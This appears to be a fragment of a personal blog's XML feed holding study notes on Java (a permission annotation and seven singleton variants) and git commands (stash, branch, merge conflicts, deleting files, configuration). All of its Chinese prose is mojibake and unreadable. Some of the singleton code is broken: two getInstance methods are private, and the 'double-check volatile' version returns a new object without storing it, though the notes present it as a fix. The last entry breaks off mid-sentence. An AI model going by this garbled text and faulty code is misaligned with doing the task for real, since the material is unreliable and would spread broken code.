title="ÂêéÁ´ØË∞ÉÁî®‰ª£Á†Å"></a>ÂêéÁ´ØË∞ÉÁî®‰ª£Á†Å</h2><pre><code>@Permission(&quot;/admin/disable&quot;)    @RequestMapping(&quot;/disable&quot;)    @ResponseBody    public Object administratorDisable(Integer userId){        Integer returnCode = adminService.setStatus(Admin.builder().id(userId.longValue()).status(false).build());        if(returnCode == 0){            return LayData.builder().code(400).build();        }else{            return LayData.builder().code(200).build();        }    }</code></pre><blockquote><p>Êàë‰ºöÊõ¥Âä†ËµûÂêå‰∏Ä‰∫õËßÇÁÇπ,ÂÅ∑Êáí‰πüÊòØ‰∫∫Á±ªËøõÊ≠•ÁöÑÈò∂Ê¢Ø.</p><p>Âú®ÊàëÂèëÁé∞Ë¶ÅÂÅöÈáçÂ§çÁöÑ‰∫ãÊÉÖÁöÑÊó∂ÂÄô,Á¨¨‰∏Ä‰∏™ÊÉ≥Âà∞ÁöÑ‰∫ãÊÉÖ,Â∫îËØ•ÊòØÂçÅÂàÜÊúâÊñπÊ≥ïÁÆÄÂåñÂÆÉ</p><p>Ê≠§Â§Ñ,Ë¶ÅÊÑüË∞¢gunsÂºÄÊ∫êÊ°ÜÊû∂,ÁªôÊàëÁöÑÁÅµÊÑü,‰ΩøÁî®Ê≥®Ëß£ÂÆûÁé∞aop</p></blockquote><p><a href="https://blog.csdn.net/jiaobuchong/article/details/50420379" target="_blank" rel="noopener"> aop‰∏≠Ëé∑Âèñrequest </a><br><a href="https://gitee.com/stylefeng/guns/blob/master/src/main/java/cn/stylefeng/guns/core/aop/PermissionAop.java" target="_blank" rel="noopener"> Ê≥®Ëß£ÈÖçÂêàaop‰ΩøÁî®,Êù•Ëá™gunsÊ∫êÁ†Å</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> aop </tag>
            
            <tag> annotation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git stash</title>
      <link href="/2019/05/08/git%20stash/"/>
      <url>/2019/05/08/git%20stash/</url>
      
        <content type="html"><![CDATA[<h1 id="Git-Â∑•ÂÖ∑-ÂÇ®ËóèÔºàStashingÔºâ"><a href="#Git-Â∑•ÂÖ∑-ÂÇ®ËóèÔºàStashingÔºâ" class="headerlink" title="Git Â∑•ÂÖ∑ - ÂÇ®ËóèÔºàStashingÔºâ"></a>Git Â∑•ÂÖ∑ - ÂÇ®ËóèÔºàStashingÔºâ</h1><blockquote><p>ÁªèÂ∏∏ÊúâËøôÊ†∑ÁöÑ‰∫ãÊÉÖÂèëÁîüÔºåÂΩì‰Ω†Ê≠£Âú®ËøõË°åÈ°πÁõÆ‰∏≠Êüê‰∏ÄÈÉ®ÂàÜÁöÑÂ∑•‰ΩúÔºåÈáåÈù¢ÁöÑ‰∏úË•øÂ§Ñ‰∫é‰∏Ä‰∏™ÊØîËæÉÊùÇ‰π±ÁöÑÁä∂ÊÄÅÔºåËÄå‰Ω†ÊÉ≥ËΩ¨Âà∞ÂÖ∂‰ªñÂàÜÊîØ‰∏äËøõË°å‰∏Ä‰∫õÂ∑•‰Ωú„ÄÇÈóÆÈ¢òÊòØÔºå‰Ω†‰∏çÊÉ≥Êèê‰∫§ËøõË°å‰∫Ü‰∏ÄÂçäÁöÑÂ∑•‰ΩúÔºåÂê¶Âàô‰ª•Âêé‰Ω†Êó†Ê≥ïÂõûÂà∞Ëøô‰∏™Â∑•‰ΩúÁÇπ„ÄÇËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÁöÑÂäûÊ≥ïÂ∞±ÊòØ<br><code>git stash</code> ÂëΩ‰ª§„ÄÇ</p><p>‚Äú‚ÄòÂÇ®Ëóè‚Äù‚ÄúÂèØ‰ª•Ëé∑Âèñ‰Ω†Â∑•‰ΩúÁõÆÂΩïÁöÑ‰∏≠Èó¥Áä∂ÊÄÅ‚Äî‚Äî‰πüÂ∞±ÊòØ‰Ω†‰øÆÊîπËøáÁöÑË¢´ËøΩË∏™ÁöÑÊñá‰ª∂ÂíåÊöÇÂ≠òÁöÑÂèòÊõ¥‚Äî‚ÄîÂπ∂Â∞ÜÂÆÉ‰øùÂ≠òÂà∞‰∏Ä‰∏™Êú™ÂÆåÁªìÂèòÊõ¥ÁöÑÂ†ÜÊ†à‰∏≠ÔºåÈöèÊó∂ÂèØ‰ª•ÈáçÊñ∞Â∫îÁî®„ÄÇ</p></blockquote><h3 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h3><blockquote><p>Áé∞Âú®‰Ω†ÊÉ≥ÂàáÊç¢ÂàÜÊîØÔºå‰ΩÜÊòØ‰Ω†Ëøò‰∏çÊÉ≥Êèê‰∫§‰Ω†Ê≠£Âú®ËøõË°å‰∏≠ÁöÑÂ∑•‰ΩúÔºõÊâÄ‰ª•‰Ω†ÂÇ®ËóèËøô‰∫õÂèòÊõ¥„ÄÇ‰∏∫‰∫ÜÂæÄÂ†ÜÊ†àÊé®ÈÄÅ‰∏Ä‰∏™Êñ∞ÁöÑÂÇ®ËóèÔºåÂè™Ë¶ÅËøêË°å <code>git stash</code></p></blockquote><pre><code>huskyui@ubuntu:~/Desktop/git/lesson09$ echo &quot;ddd&quot;&gt;d.txthuskyui@ubuntu:~/Desktop/git/lesson09$ git add .huskyui@ubuntu:~/Desktop/git/lesson09$ git stashSaved working directory and index state WIP on dev: 1785850 second commithuskyui@ubuntu:~/Desktop/git/lesson09$ git statusOn branch devnothing to commit, working tree cleanhuskyui@ubuntu:~/Desktop/git/lesson09$ git checkout masterSwitched to branch &apos;master&apos;huskyui@ubuntu:~/Desktop/git/lesson09$ git statusOn branch masternothing to commit, working tree clean</code></pre><h3 id="git-stash-list"><a href="#git-stash-list" class="headerlink" title="git stash list"></a>git stash list</h3><blockquote><p>ËøôÊó∂Ôºå‰Ω†ÂèØ‰ª•Êñπ‰æøÂú∞ÂàáÊç¢Âà∞ÂÖ∂‰ªñÂàÜÊîØÂ∑•‰ΩúÔºõ‰Ω†ÁöÑÂèòÊõ¥ÈÉΩ‰øùÂ≠òÂú®Ê†à‰∏ä„ÄÇË¶ÅÊü•ÁúãÁé∞ÊúâÁöÑÂÇ®ËóèÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî® <code>git stash list</code> Ôºö</p></blockquote><pre><code>huskyui@ubuntu:~/Desktop/git/lesson09$ git stash liststash@{0}: WIP on dev: 1785850 second commitstash@{1}: WIP on master: 0b94950 inital commitstash@{2}: WIP on master: 0b94950 inital commitstash@{3}: WIP on dev: 0b94950 inital commit</code></pre><h3 id="git-stash-apply"><a href="#git-stash-apply" class="headerlink" title="git stash apply"></a>git stash apply</h3><blockquote><p>ÂØπÊñá‰ª∂ÁöÑÂèòÊõ¥Ë¢´ÈáçÊñ∞Â∫îÁî®Ôºå‰ΩÜÊòØË¢´ÊöÇÂ≠òÁöÑÊñá‰ª∂Ê≤°ÊúâÈáçÊñ∞Ë¢´ÊöÇÂ≠ò„ÄÇÊÉ≥ÈÇ£Ê†∑ÁöÑËØùÔºå‰Ω†ÂøÖÈ°ªÂú®ËøêË°å <code>git stash apply</code> ÂëΩ‰ª§Êó∂Â∏¶‰∏ä‰∏Ä‰∏™ <code>--index</code> ÁöÑÈÄâÈ°πÊù•ÂëäËØâÂëΩ‰ª§ÈáçÊñ∞Â∫îÁî®Ë¢´ÊöÇÂ≠òÁöÑÂèòÊõ¥„ÄÇÂ¶ÇÊûú‰Ω†ÊòØËøô‰πàÂÅöÁöÑÔºå‰Ω†Â∫îËØ•Â∑≤ÁªèÂõûÂà∞‰Ω†ÂéüÊù•ÁöÑ‰ΩçÁΩÆ</p></blockquote><pre><code>huskyui@ubuntu:~/Desktop/git/lesson09$ git stash apply 0On branch masterChanges to be committed:  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)    new file:   d.txt</code></pre><h3 id="git-stash-drop"><a href="#git-stash-drop" class="headerlink" title="git stash drop"></a>git stash drop</h3><blockquote><p>apply ÈÄâÈ°πÂè™Â∞ùËØïÂ∫îÁî®ÂÇ®ËóèÁöÑÂ∑•‰Ωú‚Äî‚ÄîÂÇ®ËóèÁöÑÂÜÖÂÆπ‰ªçÁÑ∂Âú®Ê†à‰∏ä„ÄÇË¶ÅÁßªÈô§ÂÆÉÔºå‰Ω†ÂèØ‰ª•ËøêË°å <code>git stash drop</code> ÔºåÂä†‰∏ä‰Ω†Â∏åÊúõÁßªÈô§ÁöÑÂÇ®ËóèÁöÑÂêçÂ≠óÔºö</p></blockquote><pre><code>huskyui@ubuntu:~/Desktop/git/lesson09$ git stash drop 0Dropped refs/stash@{0} (b1b6018668f2acbe33f11218f3c2759de07f8e86)</code></pre><h3 id="git-stash-is-a-stack-Âà†Èô§Êó∂-ÊØèÊ¨°ÈÉΩÊòØÊúÄËøëÁöÑ‰∏Ä‰∏™"><a href="#git-stash-is-a-stack-Âà†Èô§Êó∂-ÊØèÊ¨°ÈÉΩÊòØÊúÄËøëÁöÑ‰∏Ä‰∏™" class="headerlink" title="git stash is a stack,Âà†Èô§Êó∂,ÊØèÊ¨°ÈÉΩÊòØÊúÄËøëÁöÑ‰∏Ä‰∏™"></a>git stash is a stack,Âà†Èô§Êó∂,ÊØèÊ¨°ÈÉΩÊòØÊúÄËøëÁöÑ‰∏Ä‰∏™</h3>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git branch</title>
      <link href="/2019/05/08/git%20branch/"/>
      <url>/2019/05/08/git%20branch/</url>
      
        <content type="html"><![CDATA[<h2 id="git-basic-branch"><a href="#git-basic-branch" class="headerlink" title="git basic branch"></a>git basic branch</h2><pre><code>git branch &lt;branchName&gt;#create branchgit branch --list#show branch list,git checkout &lt;branchName&gt;#choose branch,HEAD is pointer of the current branch last commit</code></pre><h2 id="create-a-file-in-branch-0-0-1-then-checkout-master-merge-0-0-1"><a href="#create-a-file-in-branch-0-0-1-then-checkout-master-merge-0-0-1" class="headerlink" title="create a file in branch 0.0.1,then checkout master ,merge 0.0.1"></a>create a file in branch 0.0.1,then checkout master ,merge 0.0.1</h2><pre><code>git checkout 0.0.1echo &quot;b&quot;&gt;b.txtgit add b.txtgit commit -m &quot;add b.txt&quot;git checkout mastergit merge 0.0.1</code></pre><h2 id="git-alias"><a href="#git-alias" class="headerlink" title="git alias"></a>git alias</h2><pre><code>huskyui@ubuntu:~/Desktop/git/lesson07$ git log --graph --decorate --oneline* 89f9c31 (HEAD -&gt; master, 0.0.1) add b* 4ed2d10 3* 96d5837 2* 26abdbb 1* c85c670 inital commit</code></pre><p>use alias</p><pre><code>huskyui@ubuntu:~/Desktop/git/lesson07$ git config --local alias.tree &apos;log --graph --decorate --oneline&apos;huskyui@ubuntu:~/Desktop/git/lesson07$ git tree* 89f9c31 (HEAD -&gt; master, 0.0.1) add b* 4ed2d10 3* 96d5837 2* 26abdbb 1* c85c670 inital commit</code></pre><h2 id="checkout-b"><a href="#checkout-b" class="headerlink" title="checkout -b"></a>checkout -b</h2><pre><code>git checkout -b iss53#Switched to a new branch &quot;iss53&quot;# git branch iss53# git checkout iss53</code></pre><h2 id="merge-conflict"><a href="#merge-conflict" class="headerlink" title="merge conflict"></a>merge conflict</h2><pre><code>huskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;hellowoold&quot;&gt;c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git add .huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;master commit c.txt&quot;[master 430916b] master commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git checkout devSwitched to branch &apos;dev&apos;huskyui@ubuntu:~/Desktop/git/lesson08$ lsa.txt  b.txthuskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;helloworld&quot;&gt;c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git add .huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;dev commit c.txt&quot;[dev 01a61b3] dev commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git checkout masterSwitched to branch &apos;master&apos;huskyui@ubuntu:~/Desktop/git/lesson08$ git merge devAuto-merging c.txtCONFLICT (add/add): Merge conflict in c.txtAutomatic merge failed; fix conflicts and then commit the result.huskyui@ubuntu:~/Desktop/git/lesson08$ git statusOn branch masterYou have unmerged paths.  (fix conflicts and run &quot;git commit&quot;)  (use &quot;git merge --abort&quot; to abort the merge)Unmerged paths:  (use &quot;git add &lt;file&gt;...&quot; to mark resolution)    both added:      c.txtno changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)huskyui@ubuntu:~/Desktop/git/lesson08$ vi c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git add c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m &quot;fixed conflict&quot;[master 2e602f6] fixed conflicthuskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..devhuskyui@ubuntu:~/Desktop/git/lesson08$ git merge devAlready up to date.huskyui@ubuntu:~/Desktop/git/lesson08$ git branch --list  dev* masterhuskyui@ubuntu:~/Desktop/git/lesson08$ git checkout devSwitched to branch &apos;dev&apos;huskyui@ubuntu:~/Desktop/git/lesson08$ git merge masterUpdating 01a61b3..2e602f6Fast-forward</code></pre><h2 id="abort-merge"><a href="#abort-merge" class="headerlink" title="abort merge"></a>abort merge</h2><pre><code>huskyui@ubuntu:~/Desktop/git/lesson08$ git merge devAuto-merging c.txtCONFLICT (content): Merge conflict in c.txtAutomatic merge failed; fix conflicts and then commit the result.huskyui@ubuntu:~/Desktop/git/lesson08$ git merge --aborthuskyui@ubuntu:~/Desktop/git/lesson08$ git statusOn branch masternothing to commit, working tree cleanhuskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..devdiff --git a/c.txt b/c.txtindex 74b0666..1d8e2de 100644--- a/c.txt+++ b/c.txt@@ -1 +1 @@-helloworlxajsdjsads  d+hsdfelloworldhuskyui@ubuntu:~/Desktop/git/lesson08$ git merge devAuto-merging c.txtCONFLICT (content): Merge conflict in c.txtAutomatic merge failed; fix conflicts and then commit the result.huskyui@ubuntu:~/Desktop/git/lesson08$ lsa.txt  b.txt  c.txthuskyui@ubuntu:~/Desktop/git/lesson08$ git merge deverror: Merging is not possible because you have unmerged files.hint: Fix them up in the work tree, and then use &apos;git add/rm &lt;file&gt;&apos;hint: as appropriate to mark resolution and make a commit.fatal: Exiting because of an unresolved conflict.</code></pre><h2 id="delete-branch"><a href="#delete-branch" class="headerlink" title="delete branch"></a>delete branch</h2><pre><code>git branch -d dev#delete branch dev</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>singleton</title>
      <link href="/2019/05/04/singleton/"/>
      <url>/2019/05/04/singleton/</url>
      
        <content type="html"><![CDATA[<h2 id="Âçï‰æã"><a href="#Âçï‰æã" class="headerlink" title="Âçï‰æã"></a>Âçï‰æã</h2><blockquote><p>SingletonÁ±ªË¢´Áß∞‰∏∫Âçï‰æãÁ±ª,ÈÄöËøá‰ΩøÁî®privateÁöÑÊûÑÈÄ†ÂáΩÊï∞Á°Æ‰øù‰∫ÜÂú®‰∏Ä‰∏™Â∫îÁî®Âè™‰∫ßÁîü‰∏Ä‰∏™ÂÆû‰æã.</p><p>-‚ÄîËÆæËÆ°Ê®°Âºè‰πãÁ¶Ö</p></blockquote><h2 id="‰ΩøÁî®Âú∫ÊôØ"><a href="#‰ΩøÁî®Âú∫ÊôØ" class="headerlink" title="‰ΩøÁî®Âú∫ÊôØ"></a>‰ΩøÁî®Âú∫ÊôØ</h2><blockquote><p>Âú®‰∏Ä‰∏™Á≥ªÁªü‰∏≠,Ë¶ÅÊ±Ç‰∏Ä‰∏™Á±ªÊúâ‰∏î‰ªÖÊúâ‰∏Ä‰∏™ÂØπË±°,Â¶ÇÊûúÂá∫Áé∞Â§ö‰∏™ÂØπË±°Â∞±‰ºöÂá∫Áé∞‚Äù‰∏çËâØÂèçÂ∫î‚Äù,ÂèØ‰ª•ÈááÁî®Âçï‰æãÊ®°Âºè,</p><p>ÂÖ∑‰Ωì‰ΩøÁî®Âú∫ÊôØÂ¶Ç‰∏ã:</p><ol><li>ÈúÄË¶ÅÁîüÊàêÂîØ‰∏ÄÂ∫èÂàóÂè∑ÁöÑÁéØÂ¢É</li><li>ÂàõÂª∫‰∏Ä‰∏™ÂØπË±°ÈúÄË¶ÅÊ∂àËÄóÁöÑËµÑÊ∫êËøáÂ§ö,Â¶ÇË¶ÅËÆøÈóÆIOÂíåÊï∞ÊçÆÂ∫ìÁ≠âËµÑÊ∫ê.</li><li>Á≠âÁ≠â</li></ol></blockquote><h2 id="Âçï‰æãÁöÑÈÄêÊ∏êËøõÂåñ‰πãË∑Ø"><a href="#Âçï‰æãÁöÑÈÄêÊ∏êËøõÂåñ‰πãË∑Ø" class="headerlink" title="Âçï‰æãÁöÑÈÄêÊ∏êËøõÂåñ‰πãË∑Ø"></a>Âçï‰æãÁöÑÈÄêÊ∏êËøõÂåñ‰πãË∑Ø</h2><p>1.È•øÊ±âÂºè</p><pre><code>/** * can&apos;t lazy load * È•øÊ±âÂºè,‰∏çËÉΩÊáíÂä†ËΩΩ * @author husky * @date 2019/5/3 20:42 */public class SingletonObject1 {    private static final SingletonObject1 instance = new SingletonObject1();    private SingletonObject1(){        //empty    }    private static SingletonObject1 getInstance(){        return instance;    }}</code></pre><p>2.ÊáíÊ±âÂºè</p><pre><code>/** * Âú®Â§öÁ∫øÁ®ãÊÉÖÂÜµ‰∏ãÊòØ‰∏çÂÆâÂÖ®ÁöÑ,Âõ†‰∏∫Âú®getIntsance‰∏≠Âà§Êñ≠ÁöÑÊó∂ÂÄô,ÂèØËÉΩ‰ºöÈÄ†ÊàêÂ§ö‰∏™ÂÆû‰æãÂá∫Áé∞ * ÂÆûÁé∞ÊáíÂä†ËΩΩ,‰ΩÜÁ∫øÁ®ã‰∏çÂÆâÂÖ® * @author husky * @date 2019/5/3 21:02 */public class SingletonObject2 {    private static SingletonObject2 instance;    private SingletonObject2(){        //empty    }    public static SingletonObject2 getInstance(){        if(null == instance){            instance = new SingletonObject2();        }        return instance;    }}</code></pre><p>3.Á∫øÁ®ãÂÆâÂÖ®ÊáíÊ±âÂºè</p><pre><code>/** * Âä†‰∏ÄÊääÈîÅÂèØ‰ª•Ëß£ÂÜ≥,ËøôÊääÈîÅÊòØclassÈîÅ,SingletonObject3.class * ‰ΩÜÊòØ‰ºöÈÄ†ÊàêÊïàÁéá‰Ωé‰∏ã * ÂÆûÁé∞‰∫ÜÁ∫øÁ®ãÂÆâÂÖ®,‰ΩÜÊÄßËÉΩ‰∏çÈ´ò * @author husky * @date 2019/5/3 21:08 */public class SingletonObject3 {    private static SingletonObject3 instance;    private SingletonObject3(){        //empty    }    public synchronized static SingletonObject3 getInstance(){        if(null == instance){            instance = new SingletonObject3();        }        return instance;    }}</code></pre><p>4.double-check</p><pre><code>/** * double check * Ëß£ÂÜ≥‰∫ÜÊáíÂä†ËΩΩ‰ª•ÂèäÂçï‰æã,‰ª•ÂèäÊÄßËÉΩÈóÆÈ¢ò,‰ΩÜÊòØÊúâÈóÆÈ¢ò,ÂèØËÉΩ‰ºöÂá∫Áé∞Á©∫ÊåáÈíàÂºÇÂ∏∏ * Âú®private SingletonObject()‰ºöÈÄ†ÊàêfieldaÊàñËÄÖfieldBÊú™Ë¢´ËµãÂÄº,ÂØºËá¥Á©∫ÊåáÈíà * @author husky * @date 2019/5/3 21:31 */public class SingletonObject4 {    private static SingletonObject4 instance;    private int fieldA;    private int fieldB;    private SingletonObject4(){        fieldA = Integer.MIN_VALUE;        fieldB = Integer.MAX_VALUE;    }    public static SingletonObject4 getInstance(){        if(null == instance){            synchronized (SingletonObject4.class){                if(null == instance){                    instance = new SingletonObject4();                }            }        }        return instance;    }}</code></pre><p><em>Ê≠§Â§ÑÂá∫Áé∞ÁöÑÁ©∫ÊåáÈíàÂºÇÂ∏∏,ÂÖ∑‰ΩìÂéüÂõ†ÂèØ‰ª•Êü•Áúã</em> <a href="https://blog.csdn.net/fw0124/article/details/42737171" target="_blank" rel="noopener"> double-checkÂá∫Áé∞ÁöÑÈîôËØØ</a></p><p>5.double-check volatile</p><pre><code>/** * * Âä†ÂÖ•volatileÂèØ‰ª•ÈÅøÂÖçÁ©∫ÊåáÈíàÂºÇÂ∏∏,‰πüÂ∞±ÊòØdcl,‰ΩÜÊòØÊïàÁéáÊúâÁÇπ‰Ωé * @author husky * @date 2019/5/3 23:12 */public class SingletonObject5 {    private static volatile  SingletonObject5 instance;    private SingletonObject5(){    }    private static SingletonObject5 getInstance(){        if(null == instance){            synchronized (SingletonObject5.class){                if(null == instance){                    return new SingletonObject5();                }            }        }        return instance;    }}</code></pre><p>6.ÈùôÊÄÅÂÜÖÈÉ®Á±ª</p><pre><code>public class SingletonObject6 {    private SingletonObject6(){    }    private static class InstanceHolder {        private final static SingletonObject6 instance = new SingletonObject6();    }    public static SingletonObject6 getInstance(){        return InstanceHolder.instance;    }}</code></pre><p>7.Êûö‰∏æ,Êé®Ëçê‰ΩøÁî®6Êàñ7,ÂÖ≥‰∫éÊûö‰∏æ,‰ºöÂú®ÂêéÈù¢ÂçöÂÆ¢ÂΩì‰∏≠ËøõË°åÂàÜÊûê</p><pre><code>import java.util.stream.IntStream;/** * Êûö‰∏æÁ±ªÂûã * @author husky * @date 2019/5/4 14:37 */public class SingletonObject7 {    private SingletonObject7(){    }    private enum Singleton {        /**         * instance         * */        INSTANCE;        private final SingletonObject7 instance;        Singleton(){            instance = new SingletonObject7();        }        public SingletonObject7 getInstance(){            return instance;        }    }    public static SingletonObject7 getInstance(){        return Singleton.INSTANCE.getInstance();    }    public static void main(String[] args) {        IntStream.rangeClosed(1,50).forEach(i-&gt;{            new Thread(String.valueOf(i)){                @Override                public void run() {                    System.out.println(SingletonObject7.getInstance());                }            }.start();        });    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> ËÆæËÆ°Ê®°Âºè‰πãÁ¶Ö </tag>
            
            <tag> Âçï‰æã </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git Âà†Èô§</title>
      <link href="/2019/05/03/git%20%E5%88%A0%E9%99%A4/"/>
      <url>/2019/05/03/git%20%E5%88%A0%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="delete-file"><a href="#delete-file" class="headerlink" title="delete file"></a>delete file</h2><p>Êúâ‰∏âÁßçÊÉÖÂÜµ</p><h3 id="add-before"><a href="#add-before" class="headerlink" title="add before"></a>add before</h3><pre><code>rm rf fileName</code></pre><h3 id="add-after-and-commit-before"><a href="#add-after-and-commit-before" class="headerlink" title="add after and commit before"></a>add after and commit before</h3><pre><code>git rm --cached &lt;file&gt; #remove from cache,file will be untrackedgit rm -f &lt;file&gt; #delete file forced</code></pre><h3 id="second-add-and-commit-before"><a href="#second-add-and-commit-before" class="headerlink" title="second add and commit before"></a>second add and commit before</h3><pre><code>git reset HEAD &lt;file&gt; #remove from cache,file will be untracked</code></pre><h3 id="commit-after"><a href="#commit-after" class="headerlink" title="commit after"></a>commit after</h3><pre><code>rm -rf c.txt#delete filegit add c.txt #git rm c.txtgit commit -m &quot;delete file&quot;#or discard  changes in the git checkout -- c.txt</code></pre><h2 id="git-commit-time-metaphor"><a href="#git-commit-time-metaphor" class="headerlink" title="git commit time metaphor"></a>git commit time metaphor</h2><p>The HEAD pointer is the reference to the last commit we did or the parent of<br>the next commit we will <a href="http://do.So" target="_blank" rel="noopener"> do.So </a> ,the HEAD pointer is the road<br>sign that indicates the way to move one step back to the past.</p><pre><code>git reset --hard HEAD # go back the last commit,#Âú®Êàë‰ª¨commitÂêé‰øÆÊîπ‰∫ÜÊñá‰ª∂,ÂèØ‰ª•ÂõûÈÄÄÂà∞‰∏ä‰∏ÄÊ¨°ÁâàÊú¨</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitÊñá‰ª∂ÁîüÂëΩÂë®Êúü‰ª•ÂèäÂ¶Ç‰ΩïÁÆ°ÁêÜÊñá‰ª∂</title>
      <link href="/2019/05/02/git%E6%96%87%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6/"/>
      <url>/2019/05/02/git%E6%96%87%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="git-configuration"><a href="#git-configuration" class="headerlink" title="git configuration"></a>git configuration</h2><pre><code>git config --local      # (currentGitDir)/.git/configgit config --global     # ~/.gitconfiggit config --system     # /etc/gitconfig</code></pre><p><em>‰ºòÂÖàÁ∫ß</em></p><p>‰ªé‰∏äÂà∞‰∏ã,ÈÄêÊ∏êÈÄíÂáè</p><h2 id="file-status-lifecycle"><a href="#file-status-lifecycle" class="headerlink" title="file status lifecycle"></a>file status lifecycle</h2><p>![git files status lifecycle](<a href="http://qjrzrivoh.hd-" target="_blank" rel="noopener">http://qjrzrivoh.hd-</a><br>bkt.clouddn.com/1605373863.47939184840.png)</p><p>At this point, you should have a <em>bona fide</em> Git repository on your local<br>machine, and a checkout or <em>working copy</em> of all of its files in front of you.<br>Typically, you‚Äôll want to start making changes and committing snapshots of<br>those changes into your repository each time the project reaches a state you<br>want to record.</p><p>Remember that each file in your working directory can be in one of two states:<br><em>tracked</em> or <em>untracked</em> . Tracked files are files that were in the last<br>snapshot; they can be unmodified, modified, or staged. In short, tracked files<br>are files that Git knows about.</p><p>Untracked files are everything else ‚Äî any files in your working directory that<br>were not in your last snapshot and are not in your staging area. When you<br>first clone a repository, all of your files will be tracked and unmodified<br>because Git just checked them out and you haven‚Äôt edited anything.</p><p>As you edit files, Git sees them as modified, because you‚Äôve changed them<br>since your last commit. As you work, you selectively stage these modified<br>files and then commit all those staged changes, and the cycle repeats.</p><pre><code>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Âè™Êúâ‰∏§‰∏≠Êñá‰ª∂ÂΩ¢Âºè,‰∏ÄÁßçÊòØËøΩË∏™Êñá‰ª∂ÂΩ¢Âºè‰∏ÄÁßçÊòØÊú™ËøΩË∏™Êñá‰ª∂ÂΩ¢Âºè.</code></pre><h2 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h2><pre><code>#or use git commit -am &quot;commit message&quot;#but need add previousgit add .git commit -m &quot;commit message&quot; </code></pre><h2 id="git-cat-file"><a href="#git-cat-file" class="headerlink" title="git cat-file"></a>git cat-file</h2><pre><code>git cat-file -p hash#git cat-file -p HEAD#tree 732576b05340242b4231f13b5d2d1f2b79b48b4f#parent ae8b33a221058055149b3357825493f8a1fc3fb3#author huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700#committer huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700##third commit</code></pre><h2 id="Êé¢Á©∂gitÁöÑÊñá‰ª∂Â≠òÂÇ®"><a href="#Êé¢Á©∂gitÁöÑÊñá‰ª∂Â≠òÂÇ®" class="headerlink" title="Êé¢Á©∂gitÁöÑÊñá‰ª∂Â≠òÂÇ®"></a>Êé¢Á©∂gitÁöÑÊñá‰ª∂Â≠òÂÇ®</h2><pre><code>È¶ñÂÖàÊàë‰ª¨‰ΩøÁî®git hash-object --stdinÊääÊàëË¶Å‰øùÂ≠òÁöÑÊï∞ÊçÆÊâìÂç∞Âá∫ÂØπÂ∫îÂìàÂ∏åÂä†ÂØÜ(sha1)ÁöÑhashÂÄºÁÑ∂ÂêéÂ∞ÜËøô‰∏™Êï∞ÊçÆËæìÂÖ•Ëøõc.txtËøô‰∏™Êñá‰ª∂,Âπ∂Â∞Ü‰ªñÊèê‰∫§ÊâßË°ågit cat-file -p HEADÂèØ‰ª•Êü•ÊâæÂà∞Ê†ë,Êàë‰ª¨ËøôÊ¨°‰ΩøÁî®git cat-file -p Ëøô‰∏™Ê†ëÁöÑhash,ÂèØ‰ª•Êü•ÁúãÊñáÊú¨,Êàë‰ª¨Ê∏ÖÊ•öÁúãÂà∞Á¨¨‰∏â‰∏™c.txtÁöÑhashÂíåÊàë‰ª¨ÂàöÂºÄÂßãÊâìÂç∞Âá∫Êù•ÁöÑ‰∏úË•ø‰∏ÄÊ†∑‰∏ãÈù¢Êü•Áúã‰ªñÂ≠òÂÇ®Âú®Âì™ÂêßÂú®ÊØè‰∏™‰ªìÂ∫ìÁöÑÊúâ‰∏™ÈöêÂºèÊñá‰ª∂.gitÊàë‰ª¨Êü•Áúã 